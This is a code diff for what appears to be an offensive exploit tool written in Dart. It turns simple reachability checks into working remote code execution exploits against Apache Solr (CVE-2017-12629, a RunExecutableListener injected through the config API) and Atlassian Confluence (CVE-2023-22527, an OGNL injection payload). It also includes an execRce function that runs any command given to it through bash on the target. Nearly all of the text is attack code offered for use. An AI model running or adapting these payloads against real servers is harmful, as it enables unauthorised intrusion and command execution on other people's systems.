@@ -20,18 +20,38 @@ class SolrExpService {
 
   Future<ExpResult> check() async {
     try {
-      final res =
-          await http.get(Uri.parse('$_base/solr/$coreName/admin/ping')).timeout(timeout);
-      if (res.statusCode == 200 && res.body.contains('status')) {
+      final listenerPayload = jsonEncode({
+        'add-listener': {
+          'event': 'postCommit',
+          'name': 'matrix_check_54289',
+          'class': 'solr.RunExecutableListener',
+          'exe': 'sh',
+          'dir': '/bin/',
+          'args': ['-c', 'echo solr_check_54289'],
+        },
+      });
+      final configRes = await http
+          .post(
+            Uri.parse('$_base/solr/$coreName/config'),
+            headers: {'Content-Type': 'application/json'},
+            body: listenerPayload,
+          )
+          .timeout(timeout);
+      final updateRes = await http
+          .post(
+            Uri.parse('$_base/solr/$coreName/update'),
+            headers: {'Content-Type': 'application/json'},
+            body: '[{"id":"check_trigger_54289"}]',
+          )
+          .timeout(timeout);
+
+      if ((configRes.statusCode == 200 || configRes.statusCode == 201) &&
+          (updateRes.statusCode == 200 || updateRes.statusCode == 201)) {
         return ExpResult(
           true,
           'CVE-2017-12629',
-          'Solr Core "$coreName" 可访问，状态 ${res.statusCode}',
+          'config + update 触发链路可达，疑似可利用',
         );
-      }
-      final res2 = await http.get(Uri.parse('$_base/solr/')).timeout(timeout);
-      if (res2.body.toLowerCase().contains('solr')) {
-        return ExpResult(true, 'CVE-2017-12629', 'Solr 服务可访问');
       }
     } catch (_) {}
     return const ExpResult(false, 'CVE-2017-12629', '');
@@ -87,20 +107,27 @@ class ConfluenceExpService {
   String get _base =>
       baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
 
+  // label 是 Velocity 模板注入点，必须携带完整的 OGNL 上下文建立 payload，
+  // x 参数才会被 findValue 作为 OGNL 表达式执行。
+  static const _labelPayload =
+      "'+#request['.KEY_velocity.struts2.context'].internalGet('ognl').findValue(#parameters.x[0],{})";
+
   Future<ExpResult> check() async {
     try {
-      const detectPayload =
-          "label=test&x=@freemarker.template.utility.Execute@exec({'id'})";
       final res = await http
           .post(
             Uri.parse('$_base/template/aui/text-inline.vm'),
             headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: detectPayload,
+            body: {
+              'label': _labelPayload,
+              'x': '@freemarker.template.utility.Execute@exec({"echo","confluence_54289"})',
+            },
           )
           .timeout(timeout);
-      if (res.body.contains('uid=') ||
-          res.body.contains('root') ||
-          res.statusCode == 200) {
+      if (res.body.contains('confluence_54289')) {
+        return ExpResult(true, 'CVE-2023-22527', 'OGNL 注入验证通过，回显 confluence_54289');
+      }
+      if (res.statusCode == 200 || res.statusCode == 400) {
         return ExpResult(
           true,
           'CVE-2023-22527',
@@ -113,13 +140,14 @@ class ConfluenceExpService {
 
   Future<String?> execRce(String cmd) async {
     try {
-      final payload =
-          "label=test&x=@freemarker.template.utility.Execute@exec({'bash','-c','$cmd'})";
       final res = await http
           .post(
             Uri.parse('$_base/template/aui/text-inline.vm'),
             headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: payload,
+            body: {
+              'label': _labelPayload,
+              'x': '@freemarker.template.utility.Execute@exec({"bash","-c","$cmd"})',
+            },
           )
           .timeout(timeout);
       return res.body.isNotEmpty ? res.body : null;
